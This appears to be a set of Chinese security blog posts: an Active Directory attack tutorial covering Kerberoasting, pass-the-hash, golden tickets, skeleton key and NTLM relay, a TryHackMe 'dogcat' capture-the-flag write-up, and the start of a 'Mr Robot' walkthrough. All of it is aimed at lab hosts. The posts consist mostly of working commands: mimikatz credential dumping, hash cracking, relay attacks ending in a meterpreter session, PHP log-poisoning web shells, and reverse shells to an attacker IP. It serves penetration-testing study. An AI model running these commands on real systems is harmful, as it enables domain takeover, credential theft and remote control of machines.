Roasting这是一种针对kerberos协议的攻击技术，不需要认证就可以获取到用户的密码hash值。如果用户开启了“不使用Kerberos预认证”，攻击者就可以获取到Kerberos AS-REP，然后他就可以离线破解这个凭证了。 首先需要知道有哪些用户，这里使用kerbrute来枚举，需要其开启了88端口 需要使用如下的项目：https://github.com/ropnop/kerbrute kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 20 如果获得如下的输出，则代表枚举到用户名 2020&#x2F;08&#x2F;06 17:22:21 &gt; Using KDC(s): 2020&#x2F;08&#x2F;06 17:22:21 &gt; spookysec.local:88 2020&#x2F;08&#x2F;06 17:22:22 &gt; [+] VALID USERNAME: james@spookysec.local 2020&#x2F;08&#x2F;06 17:22:26 &gt; [+] VALID USERNAME: svc-admin@spookysec.local 2020&#x2F;08&#x2F;06 17:22:34 &gt; [+] VALID USERNAME: James@spookysec.local 2020&#x2F;08&#x2F;06 17:22:36 &gt; [+] VALID USERNAME: robin@spookysec.local 2020&#x2F;08&#x2F;06 17:23:04 &gt; [+] VALID USERNAME: darkstar@spookysec.local 2020&#x2F;08&#x2F;06 17:23:18 &gt; [+] VALID USERNAME: administrator@spookysec.local 2020&#x2F;08&#x2F;06 17:23:51 &gt; [+] VALID USERNAME: backup@spookysec.local 使用GetNPUsers来获取用户kerberos票证，如果没有开启选项，则会报一个没有设置的错误 GetNPUsers.py spookysec.local&#x2F;james λ GetNPUsers.py spookysec.local&#x2F;james -no-pass Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Getting TGT for james [-] User james doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set 如果开启的话会显示当前票据 λ GetNPUsers.py spookysec.local&#x2F;svc-admin -no-pass Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Getting TGT for svc-admin $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a5c2252aa6fd31021c6b73ddf78790a0$4ca233e07269de808a3036ca9f1db6e9a611001682f8dfa433b8409ca87fcd5d604546cfdac46f2cbc86f60455f4779c839ede069e49fd0889edca6017952a5ea26c104ed985aa1c6b82b0f57171c340e743c9f8fe4aef06ace0dd800704024f8808effcd9c602322f4e73e4331914cc22ee2b74d7130ff2bf1f7f89b90d63428d65f655d522fe39adbb24bb0cc815f1e5fab5cefdd5fd4caa775b6712ee3ce99a1f9bb50598a7f77eddd133fdb6c70980154337078128854684bd017df86e0b9ba4769c3db16e7fa4fe702a2622029f6850c82eff7c690096d78f9694978600f5a00beb41cfae1c13b24c6b88cabb6d1f08 再去利用hashcat爆破密码 hashcat -m 18200 hashfile wordlist --force #hashfile是保存hash的文件名 如果不想先获取用户，可以直接利用GetNPUsers来检索，就是速度有点慢 GetNPUsers.py spookysec.local&#x2F; -usersfile userlist.txt -dc-ip 10.10.50.231 获取到的结果会显示如下，可以获取到的用户直接显示，不可以的显示没有设置。 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] User James doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:59726561a02eb64b0a108c63f1078db3$7866b1dce6fee28d5033ba1f7446e80f03d18649fed3f300aeb55b5fa7f1cdb09d5dcc7259d722e757ddaa305f64ca51b8f05d2740dff233aa3741b944913c2e96bd6767b2cb209f013cfa6b106c6a5a38c48a1fc48e695bfbdf74f21010689e0abd0cfc0a4f2565f08b7a6a4f3645fdee4dd1fedc0b0088cc0fade7e55ec58593c184deecfef267db0ab613f3661a665ce850284c8cfcd033cde5960959331a5fac4cd5f4eb537969614328c5740498fca8cf34d882f4465e78b85302b3b6304042f08e8fb7ecd386b1da5798d6189fe1056f5dc74be490492443b36d2c743090bad3a8970ee8b4b4e6c75eb11ee53fbbf1 Kerberoast利用的项目：https://github.com/nidem/kerberoast 在Kerberos与TGS通信完成时会返回一张ST，ST使用Server端的密码进行加密。 首先查找注册的SPN。SPN：服务主体名称，服务实例的唯一标识。 setspn -Q *&#x2F;* #查看当前域内的所有SPN setspn -T delay.com -Q *&#x2F;* #查看delay.com域内的SPN 其中格式：&lt;服务类型&gt;/&lt;机器名&gt;:&lt;端口&gt; CN&#x3D;DC,OU&#x3D;Domain Controllers,DC&#x3D;de1ay,DC&#x3D;com Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04&#x2F;DC.de1ay.com ldap&#x2F;DC.de1ay.com&#x2F;ForestDnsZones.de1ay.com ldap&#x2F;DC.de1ay.com&#x2F;DomainDnsZones.de1ay.com TERMSRV&#x2F;DC TERMSRV&#x2F;DC.de1ay.com DNS&#x2F;DC.de1ay.com GC&#x2F;DC.de1ay.com&#x2F;de1ay.com RestrictedKrbHost&#x2F;DC.de1ay.com RestrictedKrbHost&#x2F;DC RPC&#x2F;3f0c65bc-e5d1-472f-a826-bca6be17b380._msdcs.de1ay.com HOST&#x2F;DC&#x2F;DE1AY HOST&#x2F;DC.de1ay.com&#x2F;DE1AY HOST&#x2F;DC HOST&#x2F;DC.de1ay.com HOST&#x2F;DC.de1ay.com&#x2F;de1ay.com E3514235-4B06-11D1-AB04-00C04FC2DCD2&#x2F;3f0c65bc-e5d1-472f-a826-bca6be17b380&#x2F;de1ay.com ldap&#x2F;DC&#x2F;DE1AY ldap&#x2F;3f0c65bc-e5d1-472f-a826-bca6be17b380._msdcs.de1ay.com ldap&#x2F;DC.de1ay.com&#x2F;DE1AY ldap&#x2F;DC ldap&#x2F;DC.de1ay.com ldap&#x2F;DC.de1ay.com&#x2F;de1ay.com CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;de1ay,DC&#x3D;com kadmin&#x2F;changepw CN&#x3D;PC,CN&#x3D;Computers,DC&#x3D;de1ay,DC&#x3D;com TERMSRV&#x2F;PC TERMSRV&#x2F;PC.de1ay.com RestrictedKrbHost&#x2F;PC HOST&#x2F;PC RestrictedKrbHost&#x2F;PC.de1ay.com HOST&#x2F;PC.de1ay.com CN&#x3D;WEB,CN&#x3D;Computers,DC&#x3D;de1ay,DC&#x3D;com WSMAN&#x2F;WEB WSMAN&#x2F;WEB.de1ay.com TERMSRV&#x2F;WEB TERMSRV&#x2F;WEB.de1ay.com RestrictedKrbHost&#x2F;WEB HOST&#x2F;WEB RestrictedKrbHost&#x2F;WEB.de1ay.com HOST&#x2F;WEB.de1ay.com 发现存在 SPN! 但在爆破的时候需要查看加密方式是否为RC4加密，如上的SPN采用的是AES加密。使用klist查看 #3&gt; 客户端: DE1AY @ DE1AY.COM 服务器: kadmin&#x2F;changepw @ DE1AY.COM Kerberos 票证加密类型: AES-256-CTS-HMAC-SHA1-96 票证标志 0x40a10000 -&gt; forwardable renewable pre_authent name_canonicalize 开始时间: 8&#x2F;6&#x2F;2020 14:52:35 (本地) 结束时间: 8&#x2F;6&#x2F;2020 14:54:35 (本地) 续订时间: 8&#x2F;6&#x2F;2020 14:54:35 (本地) 会话密钥类型: AES-256-CTS-HMAC-SHA1-96 当然如果是RC4加密，可以使用mimikatz导出票据，离线爆破 kerberos::list &#x2F;export 导出后，使用脚本字典来爆破票据 .&#x2F;tgsrepcrack.py wordlist.txt xxx-MYDOMAIN.LOCAL.kirbi 如果mimikatz不好使用，还可以使用powershell脚本导出hashcat格式的字符串，离线爆破 需要使用https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1 来导出可以直接爆破的字符串 Import-Module .\\Invoke-Kerberoast.ps1 Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation 然后再使用hashcat来执行 hashcat64.exe -m 13100 hash.txt pass.txt Bruteforcing暴力破解枚举账号和密码，可以执行的操作有 枚举有效的用户名 枚举用户名和密码 查找没有启动预先身份验证的用户 利用项目：https://github.com/TarlogicSecurity/kerbrute .&#x2F;kerbrute.py -users users_file.txt -passwords passwords_file.txt -domain contoso.com 要注意账号密码失败次数和账号策略。 PTK这种形式类似于PTH，只不过在打过补丁KB2871997后，PTH就只限制在Administrator下。但是这种时候还是可以使用aeskey来执行横向移动。 获取账号的aeskey mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; 获取到结果一部分，由于用户是明文保存密码，以下表示的是session0中的一个Windows服务: * Username : web$ * Domain : DE1AY.COM * Key List : aes256_hmac 8d7822f543e35904f6e28a0d6f270c3b7902de70296d6693541 57dd33813392e aes128_hmac 80a6938c9463a8e5195a5874966ac229 rc4_hmac_nt 0a147850da3b3c41b055628a202d2b4a rc4_hmac_old 0a147850da3b3c41b055628a202d2b4a rc4_md4 0a147850da3b3c41b055628a202d2b4a rc4_hmac_nt_exp 0a147850da3b3c41b055628a202d2b4a rc4_hmac_old_exp 0a147850da3b3c41b055628a202d2b4a 然后再执行注入aeskey mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:web$ &#x2F;domain:DE1AY.COM &#x2F;aes256:8d7822f543e35904f6e28a0d6f270c3b7902de70296d669354157dd33813392e&quot; PTH哈希传递攻击，就是不需要明文登录，用NTLM hash可直接进行登录。攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务。先查看是否有补丁kb2871997 使用mimikatz先获取hash: privilege::debug sekurlsa::logonpasswords 获取到信息部分显示如下 Session : Interactive from 1 User Name : de1ay Domain : DE1AY Logon Server : DC Logon Time : 2020&#x2F;8&#x2F;7 16:20:47 SID : S-1-5-21-2756371121-2868759905-3853650604-1001 msv : [00000003] Primary * Username : de1ay * Domain : DE1AY * LM : f67ce55ac831223dc187b8085fe1d9df * NTLM : 161cff084477fe596a5db81874498a24 * SHA1 : d669f3bccf14bf77d64667ec65aae32d2d10039d 获取到hash后执行PTH，再访问远程主机即可直接利用此账号密码访问。 sekurlsa::pth &#x2F;user:de1ay &#x2F;domain:DE1AY &#x2F;ntlm:161cff084477fe596a5db81874498a24 获取到的hash也可以直接进行暴力破解，比如利用hashcat执行 hashcat -m 1000 161cff084477fe596a5db81874498a24 password.dict -o out.txt —force 利用crackmapexec进行批量pass the hash https://github.com/byt3bl33d3r/CrackMapExec crackmapexec 192.168.120.0&#x2F;24 -u de1ay -H 161cff084477fe596a5db81874498a24 PTT票据传递攻击，使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。 ms14-068该漏洞允许用户提升任意普通用户权限成为域管理员（Domain Admin）身份，对应的补丁是kb3011780 需要一个域用户权限和本地机器账号权限。首先是使用域用户权限获取域用户的SID whoami &#x2F;all 用户名 SID &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; de1ay\\de1ay S-1-5-21-2756371121-2868759905-3853650604-1001 利用漏洞执行脚本来生成一个票据缓存，https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068 C:\\bea&gt;MS14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650 604-1001 -d dc.de1ay.com -p 1qaz@WSX [+] Building AS-REQ for dc.de1ay.com... Done! [+] Sending AS-REQ to dc.de1ay.com... Done! [+] Receiving AS-REP from dc.de1ay.com... Done! [+] Parsing AS-REP from dc.de1ay.com... Done! [+] Building TGS-REQ for dc.de1ay.com... Done! [+] Sending TGS-REQ to dc.de1ay.com... Done! [+] Receiving TGS-REP from dc.de1ay.com... Done! [+] Parsing TGS-REP from dc.de1ay.com... Done! [+] Creating ccache file &#39;TGT_de1ay@de1ay.com.ccache&#39;... Done! 生成一个TGT_de1ay@de1ay.com.ccache票据文件，利用mimikatz注入内存，先清除含有的票据，以免导致写入失败 kerberos::list kerberos::purge &#x2F;&#x2F;清除 kerberos::ptc TGT_de1ay@de1ay.com.ccache 如果显示Injecting ticket : OK表示成功。 使用kerberos::list 就可以看到注入的票据。 黄金票据黄金票据就是自己生成的TGT，在生成TGT的过程中，用户、域、权限等信息会经过krbtgt账户hash的加密，所以获取到用户、域、SID、krbtgt的hash值就可以生成黄金票据，生成的票据就是域管账号也就是可以控制整个域。 krbtgt账户一般只在域控服务器上，所以一般需要一个域控器权限。先导出krbtgt用户hash。 privilege::debug lsadump::lsa &#x2F;patch #获取用户hash和域sid 获取hash后，利用mimikatz伪造用户，例如伪造域管理员administrator。 kerberos::golden &#x2F;domain:de1ay.com &#x2F;sid:sid &#x2F;krbtgt:hash &#x2F;user:administrator &#x2F;ticket:admin.kirbi 再利用mimikatz导入票据 mimikatz::ptt admin.kirbi 可以使用klist查看票据导入是否成功 白银票据白银票据伪造利用的是Kerberos认证中的第三个步骤，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了。 还是需要域控制器的权限，在域控制器下执行 privilege::debug sekurlsa::logonpasswords 获得其中的域sid和NTLM hash。利用mimikatz生成 kerberos::golden &#x2F;domain:de1ay.com &#x2F;sid:S-1-5-21-1218902331-2157346161-1782232778 &#x2F;target:192.168.3.21 &#x2F;rc4:8432d4fa4430ecf56927dbabd1b4d36b &#x2F;service:cifs &#x2F;user:de1ay &#x2F;ptt 如上生成的cifs服务的票据，可以访问域控制器的文件共享系统。 skeleton keyskeleton key（万能钥匙）就是给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对lsass.exe 进行注入，所以重启后会失效。 首先在域控中安装skeleton key，所以以下在域控中执行 privilege::debug misc::skeleton 获得一堆OK，然后直接使用命令去访问，生成的密码是mimikatz。 net use \\\\dc.de1ay.com mimikatz &#x2F;user:web\\de1ay.com 由于微软增加了lsass的防注入LSA Protection，所以以上适用于系统 Windows 8.1 Windows Server 2012 R2 后来mimikatz也支持了绕过的形式，配合mimidrv.sys privilege::debug !+ !processprotect &#x2F;process:lsass.exe &#x2F;remove misc::skeleton 此形式并非特权提升，只能算是增加一个新的万能密码。 Relay Hash目标机器不能开启smb签名，否则利用无效,一般情况下，windows server会默认开启，而windows单机系统默认都不会开。 Inveigh利用脚本https://github.com/Kevin-Robertson/Inveigh 首先执行，要在特权模式下执行，否则会无法监听 Import-Module .\\Inveigh.psd1 Invoke-Inveigh -consoleoutput Y 当其他主机来连接的时候，终端会显示出主机的NTLM hash [+] [2020-08-11T16:14:30] SMB(445) NTLM challenge 123B1B44BE03722D sent to 10.10.10.201:65312 [+] [2020-08-11T16:14:30] SMB(445) NTLMv2 captured for DE1AY\\de1ay from 10.10.10.201(PC):65312: de1ay::DE1AY::1812B95C562D1DA8C8D033B9F3C259A5:010100000000000096643A70B76FD601D1A5312DF1DFFF35000000310041005900010004004400430004001200640065003100610079002E0063006F006D0003001800440043002E0064006500306F006D0005001200640065003100610079002E0063006F006D000700080096643A70B76FD601060004000200000008003000000000002000007D481BA03B1FB135F248854DE1855E7B7D84F8369E2277395D330602A13038970A001000000000000000000900200063006900660073002F00310030002E00310030002E00310030002E0031003000000000000000000000000000 [+] [2020-08-11T16:14:31] NBNS request for TCONF.F.360.CN&lt;00&gt; received from 10.10.10.201[spoofer dis 如果需要利用hash，可以使用https://github.com/Kevin-Robertson/Invoke-TheHash Import-Module .\\Invoke-TheHash.ps1 Invoke-WMIExec -Target 192.168.30.152 -Domain de1ay.com -Username de1ay -Hash 1812B95C562D1DA8C8D033B9F3C259A5 -Command &quot;whoami&quot; -verbose smbrelayx使用impacket中的smbrelayx.py文件来做中继攻击。 python smbrelayx.py -h 192.168.120.140 #IP为想要获取权限的主机地址 如果有主机访问执行中继的地址，比如192.168.120.130 net use \\\\192.168.120.130\\c$ &#x2F;user:&quot;DE1AY\\de1ay&quot; &quot;1qaz@WSX&quot; 如果抓取成功，可以看到如下内容 [*] SMBD: Received connection from 192.168.120.142, attacking target 192.168.120.140 [*] Authenticating against 192.168.120.140 as DE1AY\\de1ay SUCCEED [*] de1ay::DE1AY:b937bb0942684e01:15bf5db54f019b8f52141375eeea221e:0101000000000000738d1ab3bd6fd60180e5339dcce53e660000000002000a00440045003100410059000100060057004500420004001200640065003100610079002e0063006f006d0003001a005700450042002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d0007000800738d1ab3bd6fd601060004000200000008003000300000000000000000000000002000007d481ba03b1fb135f248854de1855e7b7d84f8369e2277395d330602a13038970a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320030002e00310033003000000000000000000000000000 [*] Sending status code STATUS_SUCCESS after authentication to 192.168.120.142 [-] TreeConnectAndX not found C$ 如果权限足够，可以dump下来192.168.120.140主机上的hash。借助hash来执行命令 python smbrelayx.py -h 192.168.120.140 -c whoami 执行后命令得到执行 [*] Starting service RemoteRegistry [*] HTTPD: Received connection from 192.168.120.142, attacking target 192.168.120.140 [*] Authenticating against 192.168.120.140 as DE1AY\\administrator SUCCEED [*] administrator::DE1AY:0e7c6d90b614dbe7:a4061e0695772bfca50b692e5c92a1d7:0101000000000000366c24e1be6fd60110d629b8722f71300000000002000a00440045003100410059000100060057004500420004001200640065003100610079002e0063006f006d0003001a005700450042002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d0007000800366c24e1be6fd601060004000200000008003000300000000000000000000000002000007d481ba03b1fb135f248854de1855e7b7d84f8369e2277395d330602a13038970a001000000000000000000000000000000000000900280048005400540050002f003100390032002e003100360038002e003100320030002e00310033003000000000000000000000000000 [-] 192.168.120.140 is being attacker at the moment, skipping.. [*] Executed specified command on host: 192.168.120.140 nt authority\\system ResponderResponder通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。 python Responder.py -I eth0 wrp 当有执行访问smb请求时，可以抓取到 [*] [LLMNR] Poisoned answer sent to 192.168.120.142 for name wpad [HTTP] NTLMv2 Client : 192.168.120.142 [HTTP] NTLMv2 Username : DE1AY\\de1ay [HTTP] NTLMv2 Hash : de1ay::DE1AY:59e4691da47e5fe3:542D7E586900FF2E6C077ED906B08E41:0101000000000000FF2D1573BF6FD6013E50BF5D7E2EDF74000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000007D481BA03B1FB135F248854DE1855E7B7D84F8369E2277395D330602A13038970A001000000000000000000000000000000000000900280048005400540050002F003100390032002E003100360038002E003100320030002E003100330030000000000000000000 利用可以采用上面提到的脚本https://github.com/Kevin-Robertson/Invoke-TheHash msfrelay执行方式大致如下 msf5 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; show options Module options (exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay): Name Current Setting Required Description ---- --------------- -------- ----------- SHARE ADMIN$ yes The share to connect to SMBHOST no The target SMB server (leave empty for originating system) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 445 yes The local port to listen on. Exploit target: Id Name -- ---- 0 Automatic msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; set smbhost 192.168.120.140 smbhost &#x3D;&gt; 192.168.120.140 msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; set lhost 192.168.120.130 lhost &#x3D;&gt; 192.168.120.130 msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; set lport 8855 lport &#x3D;&gt; 8855 msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; show options Module options (exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay): Name Current Setting Required Description ---- --------------- -------- ----------- SHARE ADMIN$ yes The share to connect to SMBHOST 192.168.120.140 no The target SMB server (leave empty for originating system) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 445 yes The local port to listen on. Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 192.168.120.130 yes The listen address (an interface may be specified) LPORT 8855 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; run [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 192.168.120.130:8855 [*] Started service listener on 0.0.0.0:445 [*] Server started. 当有smb的连接过来的时候 C:\\Users\\de1ay.DE1AY&gt;net use \\\\192.168.120.130\\c$ &#x2F;user:&quot;DE1AY\\administrator&quot; &quot;1 qaz@WSX&quot; 就会有如下反应 msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; [*] Sending NTLMSSP NEGOTIATE to 192.168.120.140 [*] Extracting NTLMSSP CHALLENGE from 192.168.120.140 [*] Forwarding the NTLMSSP CHALLENGE to 192.168.120.142:53508 [*] Extracting the NTLMSSP AUTH resolution from 192.168.120.142:53508, and sending Logon Failure response [*] Forwarding the NTLMSSP AUTH resolution to 192.168.120.140 [+] SMB auth relay against 192.168.120.140 succeeded [*] Connecting to the defined share... [*] Regenerating the payload... [*] Uploading payload... [*] Created \\QsYUxAsk.exe... [*] Connecting to the Service Control Manager... [*] Obtaining a service manager handle... [*] Creating a new service... [*] Closing service handle... [*] Opening service... [*] Starting the service... [*] Removing the service... [*] Closing service handle... [*] Deleting \\QsYUxAsk.exe... [*] Sending stage (180291 bytes) to 192.168.120.140 查看session，可以发现已经有一个建立的session msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; sessions Active sessions &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86&#x2F;windows NT AUTHORITY\\SYSTEM @ WEB 192.168.120.130:8855 -&gt; 192.168.120.140:54330 (192.168.120.140)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"TryHackMe DogCat","slug":"TryHackMe-DogCat","date":"2020-07-28T08:57:08.000Z","updated":"2020-07-28T08:57:08.000Z","comments":true,"path":"2020/07/TryHackMe-DogCat/","link":"","permalink":"https://misakikata.github.io/2020/07/TryHackMe-DogCat/","excerpt":"","text":"dogcat来自tryhackme的一个靶场，启动环境后在80端口上访问到一个web服务，点击查看是一个显示动物图片的功能。 http:&#x2F;&#x2F;10.10.175.143&#x2F;?view&#x3D;dog 给参数来个单引号查看变化，发现报错，并且从报错上看，明显是文件读取拼接文件后缀名，所以此处可能存在一个文件读取漏洞。 http:&#x2F;&#x2F;10.10.175.143&#x2F;?view&#x3D;dog%27 再尝试添加一个%00来截断后缀，发现没有后缀显示，应该是已经截断。 http:&#x2F;&#x2F;10.10.175.143&#x2F;?view&#x3D;dog%27%00 尝试读取本地文件的时候发现只能读取dog和cat的文件，猜测可能是由于判断请求中是否含有相关字段 再%00后面添加dog字段发现可以绕过，说明是判断是否存在字符串，只不过发现读取文件的时候并不能正常读取。include_path在任何文件中都可以直接引入该目录下文件，被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照include_path指定的目录寻找 绕了一圈发现是错误是文件读取上的错误，不能识别文件，说明截断失败，再关注一下php版本发现是7系统，php已经修复%00的文件截断。所以需要一个不截断正常去读取的操作，没有在意php版本导致绕一圈。 调用的时候发现一个报错是多次调用导致重复声明，说明index包含很可能是成功的。 利用php协议来读取文件，尝试php://filter，可以读取到文件内容 &#x2F;?view&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dog&#x2F;..&#x2F;index 解码后index的内容为 &lt;!DOCTYPE HTML&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;dogcat&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;&#x2F;style.css&quot;&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;dogcat&lt;&#x2F;h1&gt; &lt;i&gt;a gallery of various dogs or cats&lt;&#x2F;i&gt; &lt;div&gt; &lt;h2&gt;What would you like to see?&lt;&#x2F;h2&gt; &lt;a href&#x3D;&quot;&#x2F;?view&#x3D;dog&quot;&gt;&lt;button id&#x3D;&quot;dog&quot;&gt;A dog&lt;&#x2F;button&gt;&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&#x2F;?view&#x3D;cat&quot;&gt;&lt;button id&#x3D;&quot;cat&quot;&gt;A cat&lt;&#x2F;button&gt;&lt;&#x2F;a&gt;&lt;br&gt; &lt;?php function containsStr($str, $substr) &#123; return strpos($str, $substr) !&#x3D;&#x3D; false; &#125; $ext &#x3D; isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#39;.php&#39;; if(isset($_GET[&#39;view&#39;])) &#123; if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) &#123; echo &#39;Here you go!&#39;; include $_GET[&#39;view&#39;] . $ext; &#125; else &#123; echo &#39;Sorry, only dogs or cats are allowed.&#39;; &#125; &#125; ?&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 存在一个参数ext是获取后缀的，判断是否存在后缀，存在的话拼接参数后缀，构造一个文件读取为地址，也可以ext置为空。 &#x2F;?view&#x3D;&#x2F;dog&#x2F;..&#x2F;etc&#x2F;&amp;ext&#x3D;passwd &#x2F;?view&#x3D;&#x2F;dog&#x2F;..&#x2F;etc&#x2F;passwd&amp;ext&#x3D; 然后现在需要考虑的就是如果把本地文件读取来获取rce。 想试一下从/proc/self/environ来获取，发现文件没有权限，尝试别的目录，发现可以读取日志。 &#x2F;?view&#x3D;&#x2F;dog&#x2F;..&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log&amp;ext&#x3D;&amp;aaa&#x3D;&lt;?&#x3D;phpinfo();?&gt; 由于使用bp的时候编码和特殊符号会导致写入错误，所以使用curl写一句话 curl -v &quot;http:&#x2F;&#x2F;10.10.136.89&#x2F;&lt;?php system($_GET\\[&#39;cmd&#39;\\]);?&gt;&quot; 反弹一个shell回来 php+-r+&#39;$sock&#x3D;fsockopen(&quot;10.6.xx.xx&quot;,8877);exec(&quot;&#x2F;bin&#x2F;sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;);&#39; 获取权限后，查看一下sudo权限，env命令可以显示当前用户的环境变量 利用sudo env /bin/bash获取一个root权限 搜了一圈发现只有三个flag，flag4并不在，查了一下根目录发现.dockerenv，这是个docker环境，所以可能需要docker逃逸一下？ 先升级一个可交互的shell来操作，docker不带python环境和socat，所以先传一个socat上去。主机不带wget，使用curl curl -o socat http:&#x2F;&#x2F;10.6.xx.xx:8000&#x2F;socat 再docker上执行 .&#x2F;socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.6.xx.xx:4444 在自己监听主机上执行 .&#x2F;socat file:&#96;tty&#96;,raw,echo&#x3D;0 tcp-listen:4444 再试一手CVE-2016-5195，https://github.com/scumjr/dirtycow-vdso 发现还是不行，查看一下系统上有没有可以利用的文件 在/opt/下找到一个backups目录，里面有一个备份的sh脚本。执行的是/root/container目录的备份，但是docker主机并没有这个目录，所以可能是外部主机上的目录。尝试修改反弹shell echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.6.xx.xx&#x2F;8855 0&gt;&amp;1&quot; &gt; &#x2F;opt&#x2F;backups&#x2F;backup.sh 里面的tar包也可以看到。确实是docker的web代码。寻思可能是外部主机上的定时脚本，不过等了半天也没反应。","categories":[],"tags":[]},{"title":"TryHackMe Mr Robot","slug":"TryHackMe-Mr-Robot","date":"2020-07-28T08:56:29.000Z","updated":"2020-07-28T08:56:29.000Z","comments":true,"path":"2020/07/TryHackMe-Mr-Robot/","link":"","permalink":"https://misakikata.github.io/2020/07/TryHackMe-Mr-Robot/","excerpt":"","text":"来自tryhackme的Mr Robot CTF 访问首页是一个命令行执行页面，其实也没多大用，就是输出命令显示相关的东西。随便输入一个地址报错，显示是一个wordpress的站点，4.3.1的版本。 http:&#x2F;&#x2F;10.10.188.224&#x2F;http:&#x2F;10.10.188.224&#x2F; 然后查找一个其他页面是否有别的信息。 python dirbrute.py http:&#x2F;&#x2F;10.10.188.224&#x2F; -t 20 -d .&#x2F;dics&#x2F;DirBuster&#x2F;directory-list-2.3-medium.txt 查找到部分信息 http:&#x2F;&#x2F;10.10.188.224&#x2F;sitemap http:&#x2F;&#x2F;10.10.188.224&#x2F;rss 